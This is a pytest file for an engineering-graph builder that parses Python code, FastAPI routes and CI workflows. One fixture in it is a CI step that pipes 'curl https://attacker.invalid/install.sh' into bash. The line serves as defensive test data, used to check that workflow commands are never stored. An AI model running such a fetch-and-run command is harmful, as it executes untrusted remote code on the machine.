from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace

from app.intelligence.graph.builder import EngineeringGraphBuilder
from app.intelligence.graph.models import GraphNodeType, GraphRelationType
from app.intelligence.graph.service import EngineeringGraphService
from app.intelligence.graph.store import EngineeringGraphStore
from app.schemas.intelligence import GraphNodePublic


def build_snapshot(tmp_path: Path, *, commit_sha: str = "a" * 40):
    return EngineeringGraphBuilder().build(
        repo_path=tmp_path,
        user_id="user_a",
        session_id="session_a",
        repository_id="https://github.com/acme/fixture",
        commit_sha=commit_sha,
        branch="main",
        files=sorted((path for path in tmp_path.rglob("*") if path.is_file()), key=lambda item: item.as_posix()),
    )


def test_python_ast_graph_extracts_symbols_imports_and_fastapi_routes(tmp_path: Path) -> None:
    app_dir = tmp_path / "backend" / "app"
    app_dir.mkdir(parents=True)
    (app_dir / "service.py").write_text("class Service:\n    pass\n", encoding="utf-8")
    (app_dir / "main.py").write_text(
        "from .service import Service\n\n@app.get('/health')\nasync def health_check():\n    return {'ok': True}\n",
        encoding="utf-8",
    )

    snapshot = build_snapshot(tmp_path)
    by_path = {node.path: node for node in snapshot.nodes if node.type is GraphNodeType.FILE}
    main = by_path["backend/app/main.py"]
    service = by_path["backend/app/service.py"]

    assert any(
        edge.source_node_id == main.id
        and edge.target_node_id == service.id
        and edge.relation_type is GraphRelationType.IMPORTS
        for edge in snapshot.edges
    )
    assert any(node.type is GraphNodeType.FUNCTION and node.name == "health_check" for node in snapshot.nodes)
    endpoint = next(node for node in snapshot.nodes if node.type is GraphNodeType.API_ENDPOINT)
    assert endpoint.name == "/health"
    assert endpoint.attributes["method"] == "GET"


def test_workflow_commands_are_never_persisted_as_graph_attributes(tmp_path: Path) -> None:
    workflow = tmp_path / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True)
    workflow.write_text(
        "name: CI\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: curl https://attacker.invalid/install.sh | bash\n"
        "  test:\n"
        "    needs: build\n"
        "    runs-on: ubuntu-latest\n",
        encoding="utf-8",
    )

    snapshot = build_snapshot(tmp_path)
    jobs = [node for node in snapshot.nodes if node.type is GraphNodeType.CI_JOB]
    assert {node.qualified_name for node in jobs} == {"build", "test"}
    assert any(
        edge.relation_type is GraphRelationType.DEPENDS_ON
        and next(node for node in jobs if node.id == edge.source_node_id).qualified_name == "test"
        and next(node for node in jobs if node.id == edge.target_node_id).qualified_name == "build"
        for edge in snapshot.edges
    )
    serialized = snapshot.model_dump_json()
    assert "attacker.invalid" not in serialized
    assert "curl" not in serialized


def test_same_logical_symbol_gets_distinct_revision_version(tmp_path: Path) -> None:
    source = tmp_path / "app.py"
    source.write_text("def stable_name():\n    return 1\n", encoding="utf-8")
    first = build_snapshot(tmp_path, commit_sha="a" * 40)
    source.write_text("def stable_name():\n    return 2\n", encoding="utf-8")
    second = build_snapshot(tmp_path, commit_sha="b" * 40)

    first_node = next(node for node in first.nodes if node.name == "stable_name")
    second_node = next(node for node in second.nodes if node.name == "stable_name")
    assert first_node.logical_id == second_node.logical_id
    assert first_node.version_id != second_node.version_id
    assert first_node.id != second_node.id


def test_neighborhood_is_bidirectional_bounded_and_deterministic(tmp_path: Path) -> None:
    (tmp_path / "a.py").write_text("from b import value\n", encoding="utf-8")
    (tmp_path / "b.py").write_text("from c import value\n", encoding="utf-8")
    (tmp_path / "c.py").write_text("value = 1\n", encoding="utf-8")
    snapshot = build_snapshot(tmp_path)
    node_a = next(node for node in snapshot.nodes if node.path == "a.py")

    nodes, edges, truncated = EngineeringGraphService.neighborhood(snapshot, node_id=node_a.id, depth=3, limit=2)

    assert [node.path for node in nodes] == ["a.py", "b.py"]
    assert len(edges) == 1
    assert truncated is True


def test_invalid_python_is_reported_as_a_coverage_limitation_not_an_exception(tmp_path: Path) -> None:
    (tmp_path / "broken.py").write_text("def not_valid(:\n", encoding="utf-8")

    snapshot = build_snapshot(tmp_path)

    assert any("broken.py" in limitation for limitation in snapshot.coverage.limitations)
    assert any(node.path == "broken.py" for node in snapshot.nodes)


class FakeSnapshotCollection:
    def __init__(self) -> None:
        self.rows: list[dict] = []
        self.indexes: list[tuple] = []

    async def create_index(self, *args, **kwargs) -> None:
        self.indexes.append((args, kwargs))

    async def update_one(self, query: dict, update: dict, upsert: bool = False) -> None:
        if any(all(row.get(key) == value for key, value in query.items()) for row in self.rows):
            return
        if upsert:
            document = dict(update["$setOnInsert"])
            self.rows.append(document)

    async def find_one(self, query: dict, sort=None):
        matches = [row for row in self.rows if all(row.get(key) == value for key, value in query.items())]
        if not matches:
            return None
        if sort:
            field, direction = sort[0]
            matches.sort(key=lambda row: row[field], reverse=direction < 0)
        return dict(matches[0])


async def test_graph_snapshots_are_immutable_and_tenant_scoped(tmp_path: Path, monkeypatch) -> None:
    from app.intelligence.graph import store as graph_store_module

    (tmp_path / "app.py").write_text("def example():\n    return 1\n", encoding="utf-8")
    first = build_snapshot(tmp_path)
    second = build_snapshot(tmp_path)
    collection = FakeSnapshotCollection()
    monkeypatch.setattr(graph_store_module, "get_db", lambda: SimpleNamespace(engineering_graph_snapshots=collection))
    store = EngineeringGraphStore()

    await store.ensure_indexes()
    stored_first = await store.save(first)
    stored_second = await store.save(second)

    assert stored_first.id == first.id
    assert stored_second.id == first.id
    assert len(collection.rows) == 1
    assert await store.latest(user_id="user_b", session_id="session_a", repository_id=first.repository_id) is None
    assert len(collection.indexes) == 3


def test_public_node_schema_does_not_expose_tenant_or_evidence_identifiers(tmp_path: Path) -> None:
    (tmp_path / "app.py").write_text("def example():\n    return 1\n", encoding="utf-8")
    node = next(node for node in build_snapshot(tmp_path).nodes if node.path == "app.py")

    public = GraphNodePublic.from_node(node).model_dump()

    assert "tenant_id" not in public
    assert "repository_id" not in public
    assert "source_evidence_ids" not in public
